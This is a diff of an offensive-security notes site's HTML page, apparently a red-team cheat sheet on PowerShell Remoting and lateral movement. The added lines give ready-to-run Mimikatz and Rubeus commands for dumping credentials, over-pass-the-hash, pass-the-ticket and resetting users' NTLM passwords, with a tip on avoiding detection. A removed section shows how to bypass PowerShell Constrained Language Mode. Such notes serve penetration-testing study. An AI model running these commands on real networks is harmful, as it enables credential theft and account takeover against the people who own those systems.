@@ -56,8 +56,10 @@
 					
 						<li class="nav-item top-level current">
 							
-							<a href="/hackingnotes/active-directory/domain-enumeration/">Active Directory</a>
+							<a href="/hackingnotes/active-directory/introduction/">Active Directory</a>
 							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/active-directory/introduction/">Basics</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/active-directory/domain-enumeration/">Domain Enumeration</a></li>
 								
@@ -70,6 +72,10 @@
 									<li class="nav-item "><a href="/hackingnotes/active-directory/cross-forest-attacks/">Cross Forest Attacks</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/active-directory/forest-persistence/">Forest Persistence</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-certificate-services/">Active Directory Certificate Services</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/active-directory/securing-ad/">Hardening Active Directory</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-attacks/">AD Attacks</a></li>
 								
@@ -84,6 +90,8 @@
 									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/evil-pdf/">Evil PDF</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/microsoft-office-macros/">Microsoft Office Macros</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/html-application/">HTML Application (HTA)</a></li>
 								
 							</ul>
 						</li>
@@ -112,6 +120,8 @@
 							<ul>
 								
 									<li class="nav-item "><a href="/hackingnotes/exploiting/buffer-overflow/">Buffer Overflow</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/exploiting/bof-linux/">Linux BoF 32bit</a></li>
 								
 							</ul>
 						</li>
@@ -163,6 +173,10 @@
 								
 									<li class="nav-item "><a href="/hackingnotes/post-exploitation/transfering-files/">Transfering Files</a></li>
 								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/ata-evasion/">ATA Evasion</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/bypass-applocker/">Bypass APPLocker</a></li>
+								
 							</ul>
 						</li>
 					
@@ -192,10 +206,52 @@
 					
 						<li class="nav-item top-level ">
 							
+							<a href="/hackingnotes/red-team/introduction/">Red Team</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/introduction/">Introduction</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/opsec-infrastructure/">OPSEC Infrastructure</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/c2-cobaltstrike/">C2 - Cobalt Strike</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/host-reconnaissance/">Host Reconnaissance</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/host-persistence/">Host Persistence</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/host-privilege-escalation/">Host Privilege Escalation</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/lateral-movement/">Lateral Movement</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/credentials-and-user-impersonation/">Credentials & User Impersonation</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/kibana/">Kibana - The Security App</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/pivoting/">Pivoting</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/ms-sql-servers/">MS SQL Servers</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/data-protection-api/">Data Protection API (DPAPI)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/laps/">Local Administrator Password Solution (LAPS)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/microsoft-defender/">Microsoft Defender Antivirus</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/application-whitelisting/">Application Whitelisting</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/exfiltration/">Exfiltration</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
 							<a href="/hackingnotes/services/ftp/">Services</a>
 							<ul>
 								
 									<li class="nav-item "><a href="/hackingnotes/services/ftp/">PORT 21/tcp - FTP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/ssh/">PORT 22/tcp - SSH</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/services/smtp/">PORT 25/tcp - SMTP</a></li>
 								
@@ -238,6 +294,8 @@
 									<li class="nav-item "><a href="/hackingnotes/software/jenkins/">Jenkins</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/software/pypi-server/">PyPI Server</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/owa-exchange/">OWA Exchange</a></li>
 								
 							</ul>
 						</li>
@@ -291,6 +349,19 @@
 
 <p>You can get a elevated shell (<code class="highlighter-rouge">NT AUTHORITY\SYSTEM</code>) on the remote server if the credentials of the user administrator are used to authenticate (default setting).</p>
 
+<h2 id="using-credentials">Using Credentials</h2>
+
+<p>We can use other credentials:</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$user='WORKGROUP\User'; 
+$pass='passwd';
+$cred = (New-Object System.Management.Automation.PSCredential $user,(ConvertTo-SecureString $pass -AsPlainText -Force))
+</code></pre></div></div>
+<p>And use it with the parameter <code class="highlighter-rouge">-Credential</code></p>
+
+<blockquote>
+  <p><strong>Note</strong>: If password is not declared a prompt will be shown in order to enter manually.</p>
+</blockquote>
+
 <h2 id="creating-a-session">Creating a Session</h2>
 
 <p>There are two types of PowerShell Remoting:</p>
@@ -300,6 +371,8 @@
 </ul>
 
 <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Enter-PSSession -ComputerName machine01.corp.local
+Enter-PSSession -ComputerName machine01.corp.local -Credential <span class="nv">$cred</span>
+Enter-PSSession -ComputerName machine01.corp.local -Credential corp\user
 </code></pre></div></div>
 <p>We can also first create the session and append to it later.</p>
 
@@ -326,26 +399,6 @@ Invoke-Command -ComputerName machine01.corp.local -FilePath .\file.ps1
   <p><strong>RedTeam Note</strong>: Since admin privs are needed is a useful tool to check if the user has admin privs on the target machine.</p>
 </blockquote>
 
-<h3 id="powershell-constrained-language-mode-bypass">PowerShell Constrained Language Mode ByPass</h3>
-
-<p>By default PowerShell Remote run the script in a <code class="highlighter-rouge">ConstrainedLanguage</code> mode so we can not run some cmdlets which are considered to be unsafe. To check the type of language run the following command:</p>
-
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ExecutionContext</span>.SessionState.LanguageMode
-</code></pre></div></div>
-<p>Enabling constrained language mode, that dows not allow powershell execute complex ataccks such as mimikatz.</p>
-
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>Environment]::SetEnvironmentVariable<span class="o">(</span>‘__PSLockdownPolicy‘, ‘4’, ‘Machine‘<span class="o">)</span>
-</code></pre></div></div>
-<p>However, if you have access to the system and enough privileges to change environment variables, you can bypass it by removing the variable <code class="highlighter-rouge">__PSLockdownPolicy</code> and re-spawning another PowerShell instance.</p>
-
-<h4 id="powershell-downgrade">PowerShell Downgrade</h4>
-
-<p>If PowerShell 2.0 is installed we can bypass it via spawning a PowerShell 2.0 instance.</p>
-
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell -version 2
-</code></pre></div></div>
-<p><a href="https://www.ired.team/offensive-security/code-execution/powershell-constrained-language-mode-bypass">https://www.ired.team/offensive-security/code-execution/powershell-constrained-language-mode-bypass</a></p>
-
 <h2 id="execute-locally-loaded-funcitons-on-the-remote-machine">Execute locally loaded funcitons on the remote machine</h2>
 
 <p>We can execute locally loaded function on the remote machine.</p>
@@ -371,6 +424,13 @@ Hello World!
 Invoke-Command -Session <span class="nv">$sess</span> -ScriptBlock <span class="o">{</span><span class="nv">$proc</span> <span class="o">=</span> <span class="nb">Get-Process</span><span class="o">}</span>
 Invoke-Command -Session <span class="nv">$sess</span> -ScriptBlock <span class="o">{</span><span class="nv">$proc</span>.Name<span class="o">}</span>
 </code></pre></div></div>
+<h2 id="transfering-files">Transfering files</h2>
+
+<p>We can also transfer files with PSRemoting and <code class="highlighter-rouge">Copy-Item</code></p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$sess = New-PSSession -ComputerName server1
+Copy-Item C:\Windows\remote_file.txt C:\Windows\local_file.txt -FromSession $sess
+Copy-Item C:\Windows\local_file.txt C:\Windows\remote_file.txt -ToSession $sess
+</code></pre></div></div>
 
 <h1 id="dump-credentials">Dump credentials</h1>
 
@@ -389,12 +449,69 @@ Invoke-Command -Session <span class="nv">$sess</span> -ScriptBlock <span class="
 Invoke-Command -Session <span class="nv">$sess</span> -ScriptBlock <span class="o">{</span><span class="k">function</span>:Invoke-Mimikatz -DumpCreds<span class="o">}</span>
 </code></pre></div></div>
 
-<h1 id="over-pass-the-hash">Over-Pass-the-Hash</h1>
+<h1 id="over-pass-the-hash--pass-the-key">Over-Pass-the-Hash / Pass-The-Key</h1>
 
 <p>Abusing kerberos functionality we can execute commands as another user by only knowing the NTLM hash.</p>
 
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"sekurlsa::pth /usr:Administrator /domain:corp.local /ntlm:&lt;ntlmhash&gt; /run:powershell.exe"'</span>
+<ul>
+  <li>Invoke-Mimikatz</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:&lt;ntlmhash&gt; /run:powershell.exe"'</span>
 </code></pre></div></div>
+
+<blockquote>
+  <p><strong>RedTeam Note</strong>: There is a different in encryption type for timestamp between a normal <code class="highlighter-rouge">krb-as-req</code> and one using the Over-Pass-the-hash <code class="highlighter-rouge">krb-as-req</code></p>
+  <ul>
+    <li>Over-Pass-the-hash krb-as-req etype flag: <code class="highlighter-rouge">eTYPE-ARCFOUR-HMAC-MD5 (23)</code></li>
+    <li>Normal krb-as-req etype flag: <code class="highlighter-rouge">eTYPE-AES256-CTS-HMAC-SHA1-96 (18)</code></li>
+  </ul>
+
+  <p>To reduce the cahnces of detection use <code class="highlighter-rouge">aes256</code>, <code class="highlighter-rouge">aes128</code> and <code class="highlighter-rouge">NTLM(RC4)</code> together.</p>
+</blockquote>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"sekurlsa::pth /user:Administrator /domain:corp.local /aes256:&lt;aes256&gt; /aes128:&lt;aes128&gt; /ntlm:&lt;ntlmhash&gt; /run:powershell.exe"'</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Rubeus</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe asktgt /domain:dollarcorp.moneycorp.local /user:srvadmin /rc4:a98e18228819e8eec3dfa33cb68b0728 /ptt
+</code></pre></div></div>
+
+<h1 id="pass-the-ticket">Pass-The-Ticket</h1>
+
+<p>We can use the tickets that are save to a <code class="highlighter-rouge">.kirbi</code> file.</p>
+
+<ul>
+  <li>Invoke-Mimikatz</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command '"kerberos::ptt ticket.kirbi"'
+</code></pre></div></div>
+
+<ul>
+  <li>Rubeus</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe ptt /ticket:ticket.kirbi
+.\Rubeus.exe ptt /ticket:&lt;base64ticket&gt;
+</code></pre></div></div>
+
+<h1 id="manipulating-user-passwords-with-mimikatz">Manipulating User Passwords with Mimikatz</h1>
+
+<p>Mimikatz supports the ability to manipulate user password, so we can change the password to a new one and restore it later.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"lsadump::changentlm /server:dc01 /user:jeff /old:&lt;NTLM&gt; /newpassword:&lt;NTLM2&gt;"'</span>
+</code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"lsadump::setntlm /server:dc01 /user:jeff /ntlm:&lt;NTLM&gt;"'</span>
+</code></pre></div></div>
+
+<ul>
+  <li><a href="https://stealthbits.com/blog/manipulating-user-passwords-with-mimikatz/">https://stealthbits.com/blog/manipulating-user-passwords-with-mimikatz/</a></li>
+</ul>
 
 			</article>
 		</section>
